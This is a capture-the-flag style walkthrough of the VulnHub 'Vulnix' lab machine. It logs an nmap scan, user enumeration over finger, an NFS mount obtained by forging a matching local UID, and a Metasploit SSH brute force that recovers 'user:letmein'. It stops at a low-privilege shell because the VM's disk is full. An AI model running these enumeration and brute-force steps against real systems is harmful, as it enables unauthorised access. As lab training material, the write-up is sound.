# Vulnix | VulnHub
https://www.vulnhub.com/entry/hacklab-vulnix,48/

### 1. Scan
```bash
kali@kali:~$ nmap -A -p- -T4 192.168.34.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:25 EST
Nmap scan report for 192.168.34.132
Host is up (0.0038s latency).
Not shown: 65518 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2020-11-17T06:28:53+00:00; -1s from scanner time.
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3?
|_ssl-date: 2020-11-17T06:28:53+00:00; -1s from scanner time.
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35457/tcp   mountd
|   100005  1,2,3      44450/udp   mountd
|   100005  1,2,3      47668/tcp6  mountd
|   100005  1,2,3      60746/udp6  mountd
|   100021  1,3,4      39321/udp   nlockmgr
|   100021  1,3,4      41282/udp6  nlockmgr
|   100021  1,3,4      44439/tcp   nlockmgr
|   100021  1,3,4      60027/tcp6  nlockmgr
|   100024  1          40654/tcp   status
|   100024  1          48649/udp6  status
|   100024  1          53597/udp   status
|   100024  1          54385/tcp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_ssl-date: 2020-11-17T06:28:53+00:00; -1s from scanner time.
512/tcp   open  exec       netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imaps?
|_ssl-date: 2020-11-17T06:28:52+00:00; -1s from scanner time.
995/tcp   open  ssl/pop3s?
|_ssl-date: 2020-11-17T06:28:52+00:00; -1s from scanner time.
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
35457/tcp open  mountd     1-3 (RPC #100005)
40654/tcp open  status     1 (RPC #100024)
44439/tcp open  nlockmgr   1-4 (RPC #100021)
45872/tcp open  mountd     1-3 (RPC #100005)
53967/tcp open  mountd     1-3 (RPC #100005)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 325.01 seconds

kali@kali:~/Desktop/osc/vulnix$ sudo nmap -sSUC -p111 192.168.32.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:38 EST
Nmap scan report for 192.168.32.132
Host is up (0.0056s latency).

PORT    STATE         SERVICE
111/tcp filtered      rpcbind
111/udp open|filtered rpcbind

Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds

```
The machine is linux, running SSH, SMTP, POP3, IMAP and NFS. There are also some other ports open as well - 512, 513 and 514.

### 2. Enumeration
Connecting to some of the ports I don't recognise, none of them return any data, so I ignore them for now.  
Using nmap's smtp-enum-users script:
```bash
kali@kali:~$ nmap --script smtp-enum-users.nse -p 25 192.168.34.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 01:39 EST
Nmap scan report for 192.168.34.132
Host is up (0.00057s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Couldn't find any accounts
```
Looking at the linux fingerd service, this is an odd thing to find open externally as it leaks information about users on the machine. For example I can look at information about the root user:
```bash
kali@kali:~$ finger root@192.168.34.132
Login: root                             Name: root
Directory: /root                        Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```
There are also metasploit modules to assist with user enumeration.
```bash
msf5 auxiliary(scanner/finger/finger_users) > options

Module options (auxiliary/scanner/finger/finger_users):

   Name        Current Setting                                                Required  Description
   ----        ---------------                                                --------  -----------
   RHOSTS      192.168.34.132                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       79                                                             yes       The target port (TCP)
   THREADS     1                                                              yes       The number of concurrent threads (max one per host)
   USERS_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of default UNIX accounts.

msf5 auxiliary(scanner/finger/finger_users) > run

[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: backup
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: bin
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: daemon
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: games
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: gnats
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: irc
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: landscape
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: libuuid
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: list
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: lp
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: mail
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: dovecot
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: man
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: messagebus
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: news
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: nobody
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: postfix
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: proxy
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: root
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: sshd
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: sync
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: sys
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: syslog
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: user
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: dovenull
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: uucp
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: whoopsie
[+] 192.168.34.132:79     - 192.168.34.132:79 - Found user: www-data
[+] 192.168.34.132:79     - 192.168.34.132:79 Users found: backup, bin, daemon, dovecot, dovenull, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, proxy, root, sshd, sync, sys, syslog, user, uucp, whoopsie, www-data
[*] 192.168.34.132:79     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
This provides me with a list of valid user accounts on the machine. Some of these are default linux accounts, one of them - user, is an actual user account with a shell.
```
kali@kali:~$ finger user@192.168.34.132
Login: user                             Name: user
Directory: /home/user                   Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```
I also run a slightly larger wordlist but don't find any new users. Next to look at RPC. From the RPC info I can see there are some NFS services up. I should probably look at that next.
```bash
kali@kali:~/Desktop/osc/vulnix$ rpcinfo 192.168.34.132
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.209.93         status     109
    100024    1    tcp       0.0.0.0.158.206        status     109
    100024    1    udp6      ::.190.9               status     109
    100024    1    tcp6      ::.212.113             status     109
    100003    2    tcp       0.0.0.0.8.1            nfs        superuser
    100003    3    tcp       0.0.0.0.8.1            nfs        superuser
    100003    4    tcp       0.0.0.0.8.1            nfs        superuser
    100227    2    tcp       0.0.0.0.8.1            -          superuser
    100227    3    tcp       0.0.0.0.8.1            -          superuser
    100003    2    udp       0.0.0.0.8.1            nfs        superuser
    100003    3    udp       0.0.0.0.8.1            nfs        superuser
    100003    4    udp       0.0.0.0.8.1            nfs        superuser
    100227    2    udp       0.0.0.0.8.1            -          superuser
    100227    3    udp       0.0.0.0.8.1            -          superuser
    100003    2    tcp6      ::.8.1                 nfs        superuser
    100003    3    tcp6      ::.8.1                 nfs        superuser
    100003    4    tcp6      ::.8.1                 nfs        superuser
    100227    2    tcp6      ::.8.1                 -          superuser
    100227    3    tcp6      ::.8.1                 -          superuser
    100003    2    udp6      ::.8.1                 nfs        superuser
    100003    3    udp6      ::.8.1                 nfs        superuser
    100003    4    udp6      ::.8.1                 nfs        superuser
    100227    2    udp6      ::.8.1                 -          superuser
    100227    3    udp6      ::.8.1                 -          superuser
    100021    1    udp       0.0.0.0.153.153        nlockmgr   superuser                 
    100021    4    udp       0.0.0.0.153.153        nlockmgr                              
    100021    1    tcp       0.0.0.0.173.151        nlockmgr                          
    100021    3    tcp       0.0.0.0.173.151        nlockmgr                                                          
    100021    4    tcp       0.0.0.0.173.151        nlockmgr                                                              
    100021    1    udp6      ::.161.66              nlockmgr   superuser
    100021    3    udp6      ::.161.66              nlockmgr   superuser
    100021    4    udp6      ::.161.66              nlockmgr   superuser
    100021    1    tcp6      ::.234.123             nlockmgr   superuser
    100021    3    tcp6      ::.234.123             nlockmgr   superuser
    100021    4    tcp6      ::.234.123             nlockmgr   superuser
    100005    1    udp       0.0.0.0.136.166        mountd     superuser
    100005    1    tcp       0.0.0.0.210.207        mountd     superuser
    100005    1    udp6      ::.130.229             mountd     superuser
    100005    1    tcp6      ::.167.239             mountd     superuser
    100005    2    udp       0.0.0.0.223.27         mountd     superuser
    100005    2    tcp       0.0.0.0.179.48         mountd     superuser
    100005    2    udp6      ::.194.247             mountd     superuser
    100005    2    tcp6      ::.198.10              mountd     superuser
    100005    3    udp       0.0.0.0.173.162        mountd     superuser
    100005    3    tcp       0.0.0.0.138.129        mountd     superuser
    100005    3    udp6      ::.237.74              mountd     superuser
    100005    3    tcp6      ::.186.52              mountd     superuser
```
Checking out NFS with the nmap script:
```bash
kali@kali:~/Desktop/osc/vulnix$ nmap -sV --script=nfs-showmount -p 2049  192.168.34.132
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-17 02:44 EST
Nmap scan report for 192.168.34.132
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  nfs     2-4 (RPC #100003)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```
Searching for mount points in Metasploit:
```bash
msf5 auxiliary(scanner/nfs/nfsmount) > options

Module options (auxiliary/scanner/nfs/nfsmount):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PROTOCOL  udp              yes       The protocol to use (Accepted: udp, tcp)
   RHOSTS    192.168.34.132   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     111              yes       The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/nfs/nfsmount) > run

[+] 192.168.34.132:111    - 192.168.34.132 NFS Export: /home/vulnix [*]
[*] 192.168.34.132:111    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
We have one mountable share at `/home/vulnix`. This looks to be another user that is on the machine.
```bash
kali@kali:~$ finger vulnix@192.168.34.132
Login: vulnix                           Name: 
Directory: /home/vulnix                 Shell: /bin/bash
Never logged in.
No mail.
No Plan.
```
Now I just have to mount the share and check it out.
```bash
kali@kali:~/Desktop/osc/vulnix$ sudo mount -t nfs -o vers=2 192.168.34.132:/home/vulnix mounted -o nolock
kali@kali:~/Desktop/osc/vulnix$ cd mounted
bash: cd: mounted: Permission denied
kali@kali:~/Desktop/osc/vulnix$ ls -la
total 12
drwxr-xr-x  3 kali kali 4096 Nov 17 02:49 .
drwxr-xr-x 11 kali kali 4096 Nov 17 01:51 ..
drwxr-x---  2 2008 2008 4096 Sep  2  2012 mounted
```
Oh yeah, I have to make a new user to access it.
```bash
kali@kali:~/Desktop/osc/vulnix$ sudo groupadd --gid 2008 vulnix
kali@kali:~/Desktop/osc/vulnix$ sudo useradd --uid 2008 --gid 2008 vulnix
kali@kali:~/Desktop/osc/vulnix$ sudo passwd vulnix
New password: 
Retype new password: 
passwd: password updated successfully
kali@kali:~/Desktop/osc/vulnix$ su - vulnix
Password: 
su: warning: cannot change directory to /home/vulnix: No such file or directory
$ /bin/bash
vulnix@kali:/home/kali/Desktop/osc/vulnix$ cd mounted
vulnix@kali:/home/kali/Desktop/osc/vulnix/mounted$ ls -la
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 kali   kali   4096 Nov 17 02:49 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```
This seems to be a dead-end, all these files are very bare. However since I am the user, I should be able to write files to this directory, so I can add a .ssh directory and add my key.
```bash
vulnix@kali:/home/kali/Desktop/osc/vulnix/mounted$ mkdir .ssh
mkdir: cannot create directory ‘.ssh’: No space left on device
```
Ok guess not.  
NOTE: This turns out to be an issue with the VM which will prevent me from accessing this user, which is required for privesc.  
With the users I have found, I can try doing dictionary attacks against some of these running services. When bruteforcing SSH for "user", the password is found.
```bash
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                   Required  Description
   ----              ---------------                   --------  -----------
   BLANK_PASSWORDS   false                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                             no        Add all users in the current database to the list
   PASSWORD                                            no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
   RHOSTS            192.168.34.132                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22                                yes       The target port
   STOP_ON_SUCCESS   true                              yes       Stop guessing when a credential works for a host
   THREADS           30                                yes       The number of concurrent threads (max one per host)
   USERNAME          user                              no        A specific username to authenticate as
   USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                             no        Try the username as the password for all users
   USER_FILE                                           no        File containing usernames, one per line
   VERBOSE           false                             yes       Whether to print output for all attempts
msf5 auxiliary(scanner/ssh/ssh_login) > run

[+] 192.168.34.132:22 - Success: 'user:letmein' 'uid=1000(user) gid=1000(user) groups=1000(user),100(users) Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux '
[*] Command shell session 1 opened (192.168.34.142:39281 -> 192.168.34.132:22) at 2020-11-17 03:45:22 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
I now have one known set of creds: `user:letmein`.

### 3. Get a shell
Logging in as user.
```bash
kali@kali:~$ ssh user@192.168.34.132
user@192.168.34.132's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Nov 17 08:22:09 GMT 2020

  System load:  0.0              Processes:           90
  Usage of /:   99.9% of 773MB   Users logged in:     0
  Memory usage: 29%              IP address for eth0: 192.168.34.132
  Swap usage:   0%

  => / is using 99.9% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

212 packages can be updated.
134 updates are security updates.

user@vulnix:~$ whoami
user
```
Unfortunately this is as far as I can get with this machine, due to a known issue that prevents one from writing any file to the disk (note the 99.9% disk usage shown in the output above). This is said to be unintended, and unfortunately means game over.